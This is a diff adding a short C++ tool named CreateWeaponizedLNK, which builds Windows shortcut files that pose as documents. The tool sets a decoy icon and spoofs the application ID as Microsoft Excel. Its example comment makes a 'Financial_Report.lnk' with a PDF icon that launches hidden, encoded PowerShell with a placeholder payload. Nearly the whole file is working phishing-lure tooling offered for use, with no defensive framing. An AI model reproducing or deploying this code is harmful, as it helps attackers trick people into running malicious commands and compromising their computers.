@@ -1,0 +1,47 @@
+#include <Windows.h>
+#include <shlobj.h>
+#include <shlwapi.h>
+#include <iostream>
+#include "resource.h"
+
+#pragma comment(lib, "shlwapi.lib")
+
+BOOL CreateWeaponizedLNK(LPCWSTR lnkPath, LPCWSTR targetPath, LPCWSTR args, LPCWSTR iconPath) {
+    HRESULT hr = CoInitialize(NULL);
+    if (FAILED(hr)) return FALSE;
+
+    IShellLink* pShellLink = NULL;
+    hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&pShellLink);
+    if (SUCCEEDED(hr)) {
+        pShellLink->SetPath(targetPath);
+        pShellLink->SetArguments(args);
+        
+        if (iconPath && PathFileExistsW(iconPath)) {
+            pShellLink->SetIconLocation(iconPath, 0);
+        }
+
+        IPropertyStore* pPropStore;
+        hr = pShellLink->QueryInterface(IID_IPropertyStore, (void**)&pPropStore);
+        if (SUCCEEDED(hr)) {
+            PROPVARIANT pv;
+            InitPropVariantFromString(L"Microsoft Excel", &pv);
+            pPropStore->SetValue(PKEY_AppUserModel_ID, pv);
+            PropVariantClear(&pv);
+            pPropStore->Commit();
+            pPropStore->Release();
+        }
+
+        // save lnk
+        IPersistFile* pPersistFile;
+        hr = pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile);
+        if (SUCCEEDED(hr)) {
+            hr = pPersistFile->Save(lnkPath, TRUE);
+            pPersistFile->Release();
+        }
+        pShellLink->Release();
+    }
+    CoUninitialize();
+    return SUCCEEDED(hr);
+}
+
+// Example: CreateLNK(L"Financial_Report.lnk", L"powershell.exe", L"-w hidden -e payload_here", L"pdf.ico");
